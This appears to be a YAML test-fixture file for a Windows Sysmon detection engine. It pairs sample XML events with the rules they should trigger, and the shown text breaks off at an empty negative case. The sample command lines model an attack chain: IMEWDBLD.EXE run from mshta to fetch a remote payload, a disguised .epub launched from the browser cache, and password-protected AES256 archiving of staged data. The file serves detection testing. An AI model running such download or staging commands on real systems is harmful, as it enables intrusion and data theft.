family: Windows Sysmon（进程与命令行事件，XML 导出）
description: |
  正样本覆盖 windows.lolbin_download、windows.suspicious_executable_in_temp、
  windows.archive_with_password、windows.script_interpreter_encoded（编码命令）、
  windows.command_shell_suspicious_parent（文档/压缩包启动 cmd）；
  其中一条命令行含未转义的裸 `&`，用于验证 XML 修复后该事件不会被整体丢弃。
  负样本验证常规目录进程、不带密码参数的压缩、明文 `-File` 的运维脚本、
  explorer 启动的 cmd 与普通外联均不告警。
cases:
  - name: sysmon-lolbin-payload-download
    note: mshta 父子链调用 IMEWDBLD.EXE 下载远程载荷 → 系统工具载荷下载
    file: Sysmon.xml
    log: |
      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System>
          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
          <EventID>1</EventID>
          <TimeCreated SystemTime="2025-08-05T09:01:16.4092700Z" />
          <Computer>WK001.megacorpone.com</Computer>
        </System>
        <EventData>
          <Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data>
          <Data Name="CommandLine">"C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE" http://news.axonbyte.org:8000/captcha_privacy.epub</Data>
          <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
          <Data Name="User">MEGACORPONE\a.smith</Data>
        </EventData>
      </Event>
    expect:
      - rule: windows.lolbin_download
        risk: high
        count: 1
    forbid: [windows.suspicious_executable_in_temp, windows.archive_with_password]

  - name: sysmon-execution-from-inetcache
    note: 命令行含未转义 `&`，缓存目录执行 → 临时目录执行规则命中且事件未被 XML 解析丢弃
    file: Sysmon.xml
    log: |
      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System>
          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
          <EventID>1</EventID>
          <TimeCreated SystemTime="2025-08-05T09:01:18.3173653Z" />
          <Computer>WK001.megacorpone.com</Computer>
        </System>
        <EventData>
          <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
          <Data Name="CommandLine">for /f %i in ('dir /b *.epub') do (start "" "%i" & exit)</Data>
          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
          <Data Name="User">MEGACORPONE\a.smith</Data>
        </EventData>
      </Event>
    expect:
      - rule: windows.suspicious_executable_in_temp
        risk: medium
        count: 1
      - rule: windows.masquerade_extension
        risk: high
        count: 1
    forbid: [windows.lolbin_download, windows.archive_with_password]

  - name: sysmon-password-protected-archive
    note: 7-Zip 使用 -p 与 AES256 打包 → 使用密码压缩打包数据
    file: Sysmon.xml
    log: |
      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System>
          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
          <EventID>1</EventID>
          <TimeCreated SystemTime="2025-08-05T09:02:05.7444180Z" />
          <Computer>WK001.megacorpone.com</Computer>
        </System>
        <EventData>
          <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data>
          <Data Name="CommandLine">"C:\Program Files\7-Zip\7z.exe" a -tzip -pcc9441e5-1c80-4287-9c7a-4c03215c0969WK001 -mem=AES256 C:\Users\a.smith\AppData\Local\Temp\101010245WK001_protected.zip C:\Users\a.smith\AppData\Local\Temp\101010245WK001.zip</Data>
          <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
          <Data Name="User">MEGACORPONE\a.smith</Data>
        </EventData>
      </Event>
    expect:
      - rule: windows.archive_with_password
        risk: medium
        count: 1
    forbid: [windows.lolbin_download, windows.suspicious_executable_in_temp]

  - name: sysmon-normal-processes-negative
    note: 系统目录进程、不带密码参数的压缩与外联 → 不告警
    file: Sysmon.xml
    log: |
